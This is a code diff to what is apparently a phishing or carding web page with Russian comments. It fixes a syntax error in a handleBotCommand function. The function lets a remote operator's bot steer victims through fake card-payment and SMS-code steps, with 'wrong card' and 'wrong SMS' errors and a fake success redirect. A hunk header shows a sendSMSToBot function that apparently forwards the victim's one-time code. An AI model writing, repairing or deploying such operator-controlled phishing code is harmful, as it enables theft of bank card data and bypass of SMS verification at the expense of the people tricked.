@@ -953,29 +953,28 @@
 
         // ========== ОБРАБОТКА КОМАНД ОТ БОТА ==========
         function handleBotCommand(command) {
-            console.log('🤖 Обработка команды:', command);
+    console.log('🤖 Обработка команды:', command);
 
-            if (command.action === 'push') {
-                console.log('🔔 Получена команда PUSH');
-                window.showPushNotification();
-            } else if (command.action === 'sms') {
-                console.log('📱 Получена команда SMS');
-                // Уже на странице SMS, ничего не делаем
-            } else if (command.action === 'wrong_card') {
-                console.log('❌ Получена команда WRONG_CARD');
-                window.redirectToPaymentWithError();
-            } else if (command.action === 'bind') {
-                console.log('🔗 Получена команда BIND');
-                window.redirectToSuccess();
-            } else if (command.action === 'success') {
-                console.log('🎉 Получена команда SUCCESS');
-                window.redirectToSuccess();
-            }
-            } else if (command.action === 'wrong_sms') {
-                console.log('❌ Получена команда WRONG_SMS');
-                window.showWrongSMSError();
-            }
-        }
+    if (command.action === 'push') {
+        console.log('🔔 Получена команда PUSH');
+        window.showPushNotification();
+    } else if (command.action === 'sms') {
+        console.log('📱 Получена команда SMS');
+        // Уже на странице SMS, ничего не делаем
+    } else if (command.action === 'wrong_card') {
+        console.log('❌ Получена команда WRONG_CARD');
+        window.redirectToPaymentWithError();
+    } else if (command.action === 'bind') {
+        console.log('🔗 Получена команда BIND');
+        window.redirectToSuccess();
+    } else if (command.action === 'success') {
+        console.log('🎉 Получена команда SUCCESS');
+        window.redirectToSuccess();
+    } else if (command.action === 'wrong_sms') {
+        console.log('❌ Получена команда WRONG_SMS');
+        window.showWrongSMSError();
+    } // ← Закрывающая скобка для всех условий
+} // ← Закрывающая скобка функции
 
         // ========== ФУНКЦИИ РЕДИРЕКТА ==========
         window.redirectToPaymentWithError = function() {
@@ -1163,6 +1162,7 @@ async function sendSMSToBot(smsCode) {
     </script>
 </body>
 </html>
+
 
 
 
